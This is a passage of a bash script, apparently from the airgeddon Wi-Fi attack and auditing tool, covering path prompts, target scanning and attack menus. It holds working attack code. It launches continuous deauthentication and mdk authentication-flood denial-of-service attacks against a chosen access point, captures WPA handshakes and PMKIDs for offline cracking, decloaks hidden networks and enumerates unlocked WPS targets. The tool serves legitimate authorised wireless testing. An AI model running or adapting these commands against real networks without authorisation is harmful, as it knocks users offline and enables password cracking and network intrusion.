		if [ -d "${1}" ] && check_write_permissions "${1}" && [ -x "${1}" ]; then
			return 0
		else
			return 1
		fi
	else
		dir_permission_check "$(dirname "${1}")"
		return $?
	fi
}

#Check for write permissions on a given path
function check_write_permissions() {

	debug_print

	if [ -w "${1}" ]; then
		return 0
	fi
	return 1
}

#Clean some special chars from strings usually messing with autocompleted paths
function fix_autocomplete_chars() {

	debug_print

	local var
	var=${1//\\/$''}

	echo "${var}"
}

#Create a var with the name passed to the function and reading the value from the user input
function read_and_clean_path() {

	debug_print

	local var
	settings="$(shopt -p extglob)"
	shopt -s extglob

	echo -en '> '
	var=$(read -re _var; echo -n "${_var}")
	var=$(fix_autocomplete_chars "${var}")
	local regexp='^[ '"'"']*(.*[^ '"'"'])[ '"'"']*$'
	[[ ${var} =~ ${regexp} ]] && var="${BASH_REMATCH[1]}"
	eval "${1}=\$var"

	eval "${settings}"
}

#Read and validate a path
function read_path() {

	debug_print

	echo
	case ${1} in
		"handshake")
			language_strings "${language}" 148 "green"
			read_and_clean_path "enteredpath"
			if [ -z "${enteredpath}" ]; then
				enteredpath="${handshakepath}"
			fi
			enteredpath=$(set_absolute_path "${enteredpath}")
			validate_path "${enteredpath}" "${1}"
		;;
		"cleanhandshake")
			language_strings "${language}" 154 "green"
			read_and_clean_path "filetoclean"
			check_file_exists "${filetoclean}"
		;;
		"pmkid")
			language_strings "${language}" 674 "green"
			read_and_clean_path "enteredpath"
			if [ -z "${enteredpath}" ]; then
				enteredpath="${pmkidpath}"
			fi
			enteredpath=$(set_absolute_path "${enteredpath}")
			validate_path "${enteredpath}" "${1}"
		;;
		"pmkidcap")
			language_strings "${language}" 686 "green"
			read_and_clean_path "enteredpath"
			if [ -z "${enteredpath}" ]; then
				enteredpath="${pmkidcappath}"
			fi
			enteredpath=$(set_absolute_path "${enteredpath}")
			validate_path "${enteredpath}" "${1}"
		;;
		"dictionary")
			language_strings "${language}" 180 "green"
			read_and_clean_path "DICTIONARY"
			check_file_exists "${DICTIONARY}"
		;;
		"targetfilefordecrypt")
			language_strings "${language}" 188 "green"
			read_and_clean_path "enteredpath"
			check_file_exists "${enteredpath}"
		;;
		"targethashcatpmkidfilefordecrypt")
			language_strings "${language}" 188 "green"
			read_and_clean_path "hashcatpmkidenteredpath"
			check_file_exists "${hashcatpmkidenteredpath}"
		;;
		"targethashcatenterprisefilefordecrypt")
			language_strings "${language}" 188 "green"
			read_and_clean_path "hashcatenterpriseenteredpath"
			check_file_exists "${hashcatenterpriseenteredpath}"
		;;
		"targetjtrenterprisefilefordecrypt")
			language_strings "${language}" 188 "green"
			read_and_clean_path "jtrenterpriseenteredpath"
			check_file_exists "${jtrenterpriseenteredpath}"
		;;
		"rules")
			language_strings "${language}" 242 "green"
			read_and_clean_path "RULES"
			check_file_exists "${RULES}"
		;;
		"aircrackpot")
			language_strings "${language}" 441 "green"
			read_and_clean_path "aircrackpotenteredpath"
			if [ -z "${aircrackpotenteredpath}" ]; then
				aircrackpotenteredpath="${aircrack_potpath}"
			fi
			aircrackpotenteredpath=$(set_absolute_path "${aircrackpotenteredpath}")
			validate_path "${aircrackpotenteredpath}" "${1}"
		;;
		"jtrpot")
			language_strings "${language}" 611 "green"
			read_and_clean_path "jtrpotenteredpath"
			if [ -z "${jtrpotenteredpath}" ]; then
				jtrpotenteredpath="${jtr_potpath}"
			fi
			jtrpotenteredpath=$(set_absolute_path "${jtrpotenteredpath}")
			validate_path "${jtrpotenteredpath}" "${1}"
		;;
		"hashcatpot")
			language_strings "${language}" 233 "green"
			read_and_clean_path "potenteredpath"
			if [ -z "${potenteredpath}" ]; then
				potenteredpath="${hashcat_potpath}"
			fi
			potenteredpath=$(set_absolute_path "${potenteredpath}")
			validate_path "${potenteredpath}" "${1}"
		;;
		"asleappot")
			language_strings "${language}" 555 "green"
			read_and_clean_path "asleapenteredpath"
			if [ -z "${asleapenteredpath}" ]; then
				asleapenteredpath="${asleap_potpath}"
			fi
			asleapenteredpath=$(set_absolute_path "${asleapenteredpath}")
			validate_path "${asleapenteredpath}" "${1}"
		;;
		"ettercaplog")
			language_strings "${language}" 303 "green"
			read_and_clean_path "ettercap_logpath"
			if [ -z "${ettercap_logpath}" ]; then
				ettercap_logpath="${default_ettercap_logpath}"
			fi
			ettercap_logpath=$(set_absolute_path "${ettercap_logpath}")
			validate_path "${ettercap_logpath}" "${1}"
		;;
		"bettercaplog")
			language_strings "${language}" 398 "green"
			read_and_clean_path "bettercap_logpath"
			if [ -z "${bettercap_logpath}" ]; then
				bettercap_logpath="${default_bettercap_logpath}"
			fi
			bettercap_logpath=$(set_absolute_path "${bettercap_logpath}")
			validate_path "${bettercap_logpath}" "${1}"
		;;
		"ethandshake")
			language_strings "${language}" 154 "green"
			read_and_clean_path "et_handshake"
			check_file_exists "${et_handshake}"
		;;
		"writeethandshake")
			language_strings "${language}" 148 "green"
			read_and_clean_path "et_handshake"
			if [ -z "${et_handshake}" ]; then
				et_handshake="${handshakepath}"
			fi
			et_handshake=$(set_absolute_path "${et_handshake}")
			validate_path "${et_handshake}" "${1}"
		;;
		"et_captive_portallog")
			language_strings "${language}" 317 "blue"
			read_and_clean_path "et_captive_portal_logpath"
			if [ -z "${et_captive_portal_logpath}" ]; then
				et_captive_portal_logpath="${default_et_captive_portal_logpath}"
			fi
			et_captive_portal_logpath=$(set_absolute_path "${et_captive_portal_logpath}")
			validate_path "${et_captive_portal_logpath}" "${1}"
		;;
		"wpspot")
			language_strings "${language}" 123 "blue"
			read_and_clean_path "wpspotenteredpath"
			if [ -z "${wpspotenteredpath}" ]; then
				wpspotenteredpath="${wps_potpath}"
			fi
			wpspotenteredpath=$(set_absolute_path "${wpspotenteredpath}")
			validate_path "${wpspotenteredpath}" "${1}"
		;;
		"weppot")
			language_strings "${language}" 430 "blue"
			read_and_clean_path "weppotenteredpath"
			if [ -z "${weppotenteredpath}" ]; then
				weppotenteredpath="${wep_potpath}"
			fi
			weppotenteredpath=$(set_absolute_path "${weppotenteredpath}")
			validate_path "${weppotenteredpath}" "${1}"
		;;
		"enterprisepot")
			language_strings "${language}" 525 "blue"
			read_and_clean_path "enterprisepotenteredpath"
			if [ -z "${enterprisepotenteredpath}" ]; then
				enterprisepotenteredpath="${enterprise_potpath}"
			fi
			enterprisepotenteredpath=$(set_absolute_path "${enterprisepotenteredpath}")
			validate_path "${enterprisepotenteredpath}" "${1}"
		;;
		"certificates")
			language_strings "${language}" 643 "blue"
			read_and_clean_path "certificatesenteredpath"
			if [ -z "${certificatesenteredpath}" ]; then
				certificatesenteredpath="${enterprisecertspath}"
			fi
			certificatesenteredpath=$(set_absolute_path "${certificatesenteredpath}")
			validate_path "${certificatesenteredpath}" "${1}"
		;;
	esac

	validpath="$?"
	return "${validpath}"
}

#Launch the DoS selection menu before capture a Handshake or decloak a network and process the captured file
function dos_handshake_decloaking_menu() {

	debug_print

	if [ "${return_to_handshake_pmkid_decloaking_tools_menu}" -eq 1 ]; then
		return
	fi

	clear
	if [ "${1}" = "decloak" ]; then
		language_strings "${language}" 732 "title"
	else
		language_strings "${language}" 138 "title"
	fi

	current_menu="dos_handshake_decloak_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 147
	print_simple_separator
	language_strings "${language}" 139 mdk_attack_dependencies[@]
	language_strings "${language}" 140 aireplay_attack_dependencies[@]
	language_strings "${language}" 141 mdk_attack_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " attack_handshake_decloak_option
	case ${attack_handshake_decloak_option} in
		0)
			return
		;;
		1)
			if contains_element "${attack_handshake_decloak_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				ask_timeout "capture_handshake_decloak"
				if [ "${1}" = "decloak" ]; then
					decloak_window
				else
					capture_handshake_window
				fi
				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
				echo "${bssid}" > "${tmpdir}bl.txt"
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack=12
				if [ "${1}" = "decloak" ]; then
					launch_decloak_capture
				else
					launch_handshake_capture
				fi
			fi
		;;
		2)
			if contains_element "${attack_handshake_decloak_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				ask_timeout "capture_handshake_decloak"
				if [ "${1}" = "decloak" ]; then
					decloak_window
				else
					capture_handshake_window
				fi
				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack=12
				if [ "${1}" = "decloak" ]; then
					launch_decloak_capture
				else
					launch_handshake_capture
				fi
			fi
		;;
		3)
			if contains_element "${attack_handshake_decloak_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				ask_timeout "capture_handshake_decloak"
				if [ "${1}" = "decloak" ]; then
					decloak_window
				else
					capture_handshake_window
				fi
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "${mdk_command} ${interface} a -a ${bssid} -m"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack=16
				if [ "${1}" = "decloak" ]; then
					launch_decloak_capture
				else
					launch_handshake_capture
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	dos_handshake_decloaking_menu "${1}"
}

#Decloak capture launcher
function launch_decloak_capture() {

	debug_print

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		processidattack=$!
		sleep "${sleeptimeattack}" && kill "${processidattack}" &> /dev/null
	else
		sleep "${sleeptimeattack}" && kill "${processidattack}" && kill_tmux_windows "Decloaking" &> /dev/null
	fi

	decloak_check

	if check_essid_in_capture_file; then
		echo
		language_strings "${language}" 162 "yellow"
		echo
		language_strings "${language}" 736 "blue"
		language_strings "${language}" 115 "read"
		return_to_handshake_pmkid_decloaking_tools_menu=1
	else
		echo
		language_strings "${language}" 146 "red"
		language_strings "${language}" 115 "read"
	fi
}

#Handshake capture launcher
function launch_handshake_capture() {

	debug_print

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		processidattack=$!
		sleep "${sleeptimeattack}" && kill "${processidattack}" &> /dev/null
	else
		sleep "${sleeptimeattack}" && kill "${processidattack}" && kill_tmux_windows "Capturing Handshake" &> /dev/null
	fi

	handshake_capture_check

	check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"
	case "$?" in
		"0")
			handshakepath="${default_save_path}"
			handshakefilename="handshake-${bssid}.cap"
			handshakepath="${handshakepath}${handshakefilename}"

			echo
			language_strings "${language}" 162 "yellow"
			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "handshake"
			done

			cp "${tmpdir}${standardhandshake_filename}" "${enteredpath}"
			echo
			language_strings "${language}" 149 "blue"
			language_strings "${language}" 115 "read"
			return_to_handshake_pmkid_decloaking_tools_menu=1
		;;
		"1")
			echo
			language_strings "${language}" 146 "red"
			language_strings "${language}" 115 "read"
		;;
		"2")
			:
		;;
	esac
}

#Check if a Handshake is WPA2
function is_wpa2_handshake() {

	debug_print

	bash -c "aircrack-ng -a 2 -b \"${2}\" -w \"${1}\" \"${1}\" > /dev/null 2>&1"
	return $?
}

#Launch the Decloak window
function decloak_window() {

	debug_print

	echo
	language_strings "${language}" 734 "blue"
	echo
	language_strings "${language}" 735 "yellow"
	language_strings "${language}" 115 "read"
	echo
	language_strings "${language}" 325 "blue"

	rm -rf "${tmpdir}decloak"* > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Decloaking\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}decloak ${interface}" "Decloaking" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		get_tmux_process_id "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}decloak ${interface}"
		processiddecloak="${global_process_pid}"
		global_process_pid=""
	else
		processiddecloak=$!
	fi
}

#Launch the Handshake capture window
function capture_handshake_window() {

	debug_print

	echo
	language_strings "${language}" 143 "blue"
	echo
	language_strings "${language}" 144 "yellow"
	language_strings "${language}" 115 "read"
	echo
	language_strings "${language}" 325 "blue"

	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Capturing Handshake\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}" "Capturing Handshake" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		get_tmux_process_id "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}"
		processidcapture="${global_process_pid}"
		global_process_pid=""
	else
		processidcapture=$!
	fi
}

#Launch the PMKID capture window
function launch_pmkid_capture() {

	debug_print

	ask_timeout "capture_pmkid"

	echo
	language_strings "${language}" 671 "yellow"
	language_strings "${language}" 115 "read"
	echo
	language_strings "${language}" 325 "blue"

	rm -rf "${tmpdir}pmkid"* > /dev/null 2>&1

	if compare_floats_greater_or_equal "${hcxdumptool_version}" "${minimum_hcxdumptool_bpf_version}"; then

		tcpdump -i "${interface}" wlan addr3 "${bssid}" -ddd > "${tmpdir}pmkid.bpf"

		if [ "${channel}" -gt 14 ]; then
			hcxdumptool_band_modifier="b"
		else
			hcxdumptool_band_modifier="a"
		fi

		hcxdumptool_parameters="-c ${channel}${hcxdumptool_band_modifier} --rds=1 --bpf=${tmpdir}pmkid.bpf -w ${tmpdir}pmkid.pcapng"
	elif compare_floats_greater_or_equal "${hcxdumptool_version}" "${minimum_hcxdumptool_filterap_version}"; then
		rm -rf "${tmpdir}target.txt" > /dev/null 2>&1
		echo "${bssid//:}" > "${tmpdir}target.txt"
		hcxdumptool_parameters="--enable_status=1 --filterlist_ap=${tmpdir}target.txt --filtermode=2 -o ${tmpdir}pmkid.pcapng"
	else
		rm -rf "${tmpdir}target.txt" > /dev/null 2>&1
		echo "${bssid//:}" > "${tmpdir}target.txt"
		hcxdumptool_parameters="--enable_status=1 --filterlist=${tmpdir}target.txt --filtermode=2 -o ${tmpdir}pmkid.pcapng"
	fi

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"Capturing PMKID\"" "timeout -s SIGTERM ${timeout_capture_pmkid} hcxdumptool -i ${interface} ${hcxdumptool_parameters}" "Capturing PMKID" "active"
	wait_for_process "timeout -s SIGTERM ${timeout_capture_pmkid} hcxdumptool -i ${interface} ${hcxdumptool_parameters}" "Capturing PMKID"

	if hcxpcapngtool -o "${tmpdir}${standardpmkid_filename}" "${tmpdir}pmkid.pcapng" | grep -Eq "PMKID(\(s\))? written" 2> /dev/null; then
		pmkidpath="${default_save_path}"
		pmkidfilename="pmkid-${bssid}.txt"
		pmkidpath="${pmkidpath}${pmkidfilename}"

		echo
		language_strings "${language}" 162 "yellow"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "pmkid"
		done

		cp "${tmpdir}${standardpmkid_filename}" "${enteredpath}" > /dev/null 2>&1

		echo
		language_strings "${language}" 673 "blue"
		ask_yesno 684 "yes"
		if [ "${yesno}" = "y" ]; then
			if hash tshark 2> /dev/null; then
				tshark -r "${tmpdir}pmkid.pcapng" -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol && wlan.addr==${bssid})" -2 -w "${tmpdir}pmkid_transformed.cap" -F pcap > /dev/null 2>&1

				pmkidcappath="${default_save_path}"
				pmkidcapfilename="pmkid-${bssid}.cap"
				pmkidcappath="${pmkidcappath}${pmkidcapfilename}"

				validpath=1
				while [[ "${validpath}" != "0" ]]; do
					read_path "pmkidcap"
				done

				cp "${tmpdir}pmkid_transformed.cap" "${enteredpath}" > /dev/null 2>&1

				echo
				language_strings "${language}" 673 "blue"
				language_strings "${language}" 115 "read"
			else
				echo
				language_strings "${language}" 685 "red"
				language_strings "${language}" 115 "read"
			fi
		fi
	else
		echo
		language_strings "${language}" 672 "red"
		language_strings "${language}" 115 "read"
	fi
}

#Manage target exploration and parse the output files
function explore_for_targets_option() {

	debug_print

	echo
	language_strings "${language}" 103 "title"
	language_strings "${language}" 65 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	echo
	language_strings "${language}" 66 "yellow"
	echo

	local cypher_filter
	if [ -n "${1}" ]; then
		cypher_filter="${1}"
		case ${cypher_filter} in
			"WEP")
				#Only WEP
				language_strings "${language}" 67 "yellow"
			;;
			"WPA1")
				#Only WPA including WPA/WPA2 in Mixed mode
				#Not used yet in airgeddon
				:
			;;
			"WPA2")
				#Only WPA2 including WPA/WPA2 and WPA2/WPA3 in Mixed mode
				#Not used yet in airgeddon
				:
			;;
			"WPA3")
				#Only WPA3 including WPA2/WPA3 in Mixed mode
				#Not used yet in airgeddon
				:
			;;
			"WPA")
				#All, WPA, WPA2 and WPA3 including all Mixed modes
				if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
					language_strings "${language}" 527 "yellow"
				else
					language_strings "${language}" 215 "blue"
					echo
					language_strings "${language}" 361 "yellow"
				fi
			;;
		esac
		cypher_cmd=" --encrypt ${cypher_filter} "
	else
		cypher_filter=""
		cypher_cmd=" "
		language_strings "${language}" 366 "yellow"
	fi
	language_strings "${language}" 115 "read"

	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1

	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
		airodump_band_modifier="bg"
	else
		airodump_band_modifier="abg"
	fi

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for targets\"" "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets" "active"
	wait_for_process "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets"
	targetline=$(awk '/(^Station[s]?|^Client[es]?)/{print NR}' "${tmpdir}nws-01.csv" 2> /dev/null)
	targetline=$((targetline - 1))
	head -n "${targetline}" "${tmpdir}nws-01.csv" &> "${tmpdir}nws.csv"
	tail -n +"${targetline}" "${tmpdir}nws-01.csv" &> "${tmpdir}clts.csv"

	csvline=$(wc -l "${tmpdir}nws.csv" 2> /dev/null | awk '{print $1}')
	if [ "${csvline}" -le 3 ]; then
		echo
		language_strings "${language}" 68 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	rm -rf "${tmpdir}nws.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
	local i=0
	local enterprise_network_counter
	local pure_wpa3
	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ exp_auth exp_power _ _ _ exp_idlength exp_essid _; do

		pure_wpa3=""
		chars_mac=${#exp_mac}
		if [ "${chars_mac}" -ge 17 ]; then
			i=$((i + 1))
			if [ "${exp_power}" -lt 0 ]; then
				if [ "${exp_power}" -eq -1 ]; then
					exp_power=0
				else
					exp_power=$((exp_power + 100))
				fi
			fi

			exp_power=$(echo "${exp_power}" | awk '{gsub(/ /,""); print}')
			exp_essid=${exp_essid:1:${exp_idlength}}

			if [[ ${exp_channel} =~ ${valid_channels_24_and_5_ghz_regexp} ]]; then
				exp_channel=$(echo "${exp_channel}" | awk '{gsub(/ /,""); print}')
			else
				exp_channel=0
			fi

			if [[ "${exp_essid}" = "" ]] || [[ "${exp_channel}" = "-1" ]]; then
				exp_essid="(Hidden Network)"
			fi

			exp_enc=$(echo "${exp_enc}" | awk '{print $1}')

			if [ -n "${1}" ]; then
				case ${cypher_filter} in
					"WEP")
						#Only WEP
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
					;;
					"WPA1")
						#Only WPA including WPA/WPA2 in Mixed mode
						#Not used yet in airgeddon
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
					;;
					"WPA2")
						#Only WPA2 including WPA/WPA2 and WPA2/WPA3 in Mixed mode
						#Not used yet in airgeddon
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
					;;
					"WPA3")
						#Only WPA3 including WPA2/WPA3 in Mixed mode
						#Not used yet in airgeddon
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
					;;
					"WPA")
						#All, WPA, WPA2 and WPA3 including all Mixed modes
						if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
							if [[ "${exp_auth}" =~ "MGT" ]]; then
								enterprise_network_counter=$((enterprise_network_counter + 1))
								echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
							fi
						else
							[[ ${exp_auth} =~ ^[[:blank:]](SAE)$ ]] && pure_wpa3="${BASH_REMATCH[1]}"
							if [ "${pure_wpa3}" != "SAE" ]; then
								echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
							fi
						fi
					;;
				esac
			else
				echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
			fi
		fi
	done < "${tmpdir}nws.csv"

	if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]] && [[ "${enterprise_network_counter}" -eq 0 ]]; then
		echo
		language_strings "${language}" 612 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	sort -t "," -d -k 3 "${tmpdir}nws.txt" > "${tmpdir}wnws.txt"
	select_target
}

#Manage target exploration only for Access Points with WPS activated. Parse output files and print menu with results
function explore_for_wps_targets_option() {

	debug_print

	echo
	language_strings "${language}" 103 "title"
	language_strings "${language}" 65 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	echo
	language_strings "${language}" 66 "yellow"
	echo
	if ! grep -qe "${interface}" <(echo "${!wash_ifaces_already_set[@]}"); then
		language_strings "${language}" 353 "blue"
		set_wash_parameterization
		language_strings "${language}" 354 "yellow"
	else
		language_strings "${language}" 355 "blue"
	fi

	wash_band_modifier=""
	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 1 ]; then
		if check_dual_scan_on_wash; then
			wash_band_modifier=" -2 -5"
		else
			ask_yesno 145 "no"
			if [ "${yesno}" = "y" ]; then
				wash_band_modifier=" -5"
			fi
		fi
	fi

	echo
	language_strings "${language}" 411 "yellow"
	language_strings "${language}" 115 "read"

	rm -rf "${tmpdir}wps"* > /dev/null 2>&1

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for WPS targets\"" "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier} | tee \"${tmpdir}wps.txt\"" "Exploring for WPS targets" "active"
	wait_for_process "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier}" "Exploring for WPS targets"

	readarray -t WASH_PREVIEW < <(cat < "${tmpdir}wps.txt" 2> /dev/null)

	local wash_header_found=0
	local wash_line_counter=1
	for item in "${WASH_PREVIEW[@]}"; do
		if [[ ${item} =~ -{20} ]]; then
			wash_start_data_line="${wash_line_counter}"
			wash_header_found=1
			break
		else
			wash_line_counter=$((wash_line_counter + 1))
		fi
	done

	if [ "${wash_header_found}" -eq 0 ]; then
		echo
		language_strings "${language}" 417 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	washlines=$(wc -l "${tmpdir}wps.txt" 2> /dev/null | awk '{print $1}')
	if [ "${washlines}" -le "${wash_start_data_line}" ]; then
		echo
		language_strings "${language}" 68 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	clear
	language_strings "${language}" 104 "title"
	echo
	language_strings "${language}" 349 "green"
	print_large_separator

	local i=0
	local wash_counter=0
	declare -A wps_lockeds
	wps_lockeds[${wash_counter}]="No"
	while IFS=, read -r expwps_line; do

		i=$((i + 1))

		if [ "${i}" -le "${wash_start_data_line}" ]; then
			continue
		else
			wash_counter=$((wash_counter + 1))

			if [ "${wash_counter}" -le 9 ]; then
				wpssp1=" "
			else
				wpssp1=""
			fi

			expwps_bssid=$(echo "${expwps_line}" | awk '{print $1}')
			expwps_channel=$(echo "${expwps_line}" | awk '{print $2}')
			expwps_power=$(echo "${expwps_line}" | awk '{print $3}')
			expwps_version=$(echo "${expwps_line}" | awk '{print $4}')
			expwps_locked=$(echo "${expwps_line}" | awk '{print $5}')
			expwps_essid=$(echo "${expwps_line//[\`\']/}" | awk -F '\t| {2,}' '{print $NF}')

			if [ "${expwps_channel}" -le 9 ]; then
				wpssp2="  "
				if [ "${expwps_channel}" -eq 0 ]; then
					expwps_channel="-"
				fi
			elif [[ "${expwps_channel}" -ge 10 ]] && [[ "${expwps_channel}" -lt 99 ]]; then
				wpssp2=" "
			else
				wpssp2=""
			fi

			if [[ "${expwps_power}" = "" ]] || [[ "${expwps_power}" = "-00" ]]; then
				expwps_power=0
			fi

			if [[ ${expwps_power} =~ ^-0 ]]; then
				expwps_power=${expwps_power//0/}
			fi

			if [ "${expwps_power}" -lt 0 ]; then
				if [ "${expwps_power}" -eq -1 ]; then
					expwps_power=0
				else
					expwps_power=$((expwps_power + 100))
				fi
			fi

			if [ "${expwps_power}" -le 9 ]; then
				wpssp4=" "
			else
				wpssp4=""
			fi

			wash_color="${normal_color}"
			if [ "${expwps_locked}" = "Yes" ]; then
				wash_color="${red_color}"
				wpssp3=""
			else
				wpssp3=" "
			fi

			wps_network_names["${wash_counter}"]=${expwps_essid}
			wps_channels["${wash_counter}"]=${expwps_channel}
			wps_macs["${wash_counter}"]=${expwps_bssid}
			wps_lockeds["${wash_counter}"]=${expwps_locked}
			echo -e "${wash_color} ${wpssp1}${wash_counter})   ${expwps_bssid}  ${wpssp2}${expwps_channel}    ${wpssp4}${expwps_power}%   ${expwps_version}   ${expwps_locked}${wpssp3}   ${expwps_essid}"
		fi
	done < <(cat <(head -n 2 "${tmpdir}wps.txt") <(tail -n +3 "${tmpdir}wps.txt" | sort -k3,3n 2> /dev/null))

	echo
	if [ "${wash_counter}" -eq 1 ]; then
		language_strings "${language}" 70 "yellow"
		selected_wps_target_network=1
		language_strings "${language}" 115 "read"
	else
		print_large_separator
		language_strings "${language}" 3 "green"
		read -rp "> " selected_wps_target_network
	fi

	while [[ ! ${selected_wps_target_network} =~ ^[[:digit:]]+$ ]] || ((selected_wps_target_network < 1 || selected_wps_target_network > wash_counter)) || [[ ${wps_lockeds[${selected_wps_target_network}]} = "Yes" ]]; do

		if [[ ${selected_wps_target_network} =~ ^[[:digit:]]+$ ]] && ((selected_wps_target_network >= 1 && selected_wps_target_network <= wash_counter)); then
			if [ "${wps_lockeds[${selected_wps_target_network}]}" = "Yes" ]; then
				ask_yesno 350 "no"
				if [ "${yesno}" = "y" ]; then
					break
				else
					echo
					language_strings "${language}" 3 "green"
					read -rp "> " selected_wps_target_network
					continue
				fi
			fi
		fi

		echo
		language_strings "${language}" 72 "red"
		echo
		language_strings "${language}" 3 "green"
		read -rp "> " selected_wps_target_network
	done

	wps_essid=${wps_network_names[${selected_wps_target_network}]}
	check_hidden_essid "wps" "verify"
	wps_channel=${wps_channels[${selected_wps_target_network}]}
	wps_bssid=${wps_macs[${selected_wps_target_network}]}
	wps_locked=${wps_lockeds[${selected_wps_target_network}]}
}

#Create a menu to select target from the parsed data
function select_target() {

	debug_print

	clear
	language_strings "${language}" 104 "title"
	echo
	language_strings "${language}" 69 "green"
	print_large_separator
	local i=0
	while IFS=, read -r exp_mac exp_channel exp_power exp_essid exp_enc; do

		i=$((i + 1))

		if [ "${i}" -le 9 ]; then
			sp1=" "
		else
			sp1=""
		fi

		if [ "${exp_channel}" -le 9 ]; then
			sp2="  "
			if [ "${exp_channel}" -eq 0 ]; then
				exp_channel="-"
			fi
			if [ "${exp_channel}" -lt 0 ]; then
				sp2=" "
			fi
		elif [[ "${exp_channel}" -ge 10 ]] && [[ "${exp_channel}" -lt 99 ]]; then
			sp2=" "
		else
			sp2=""
		fi

		if [ "${exp_power}" = "" ]; then
			exp_power=0
		fi

		if [ "${exp_power}" -le 9 ]; then
			sp4=" "
		else
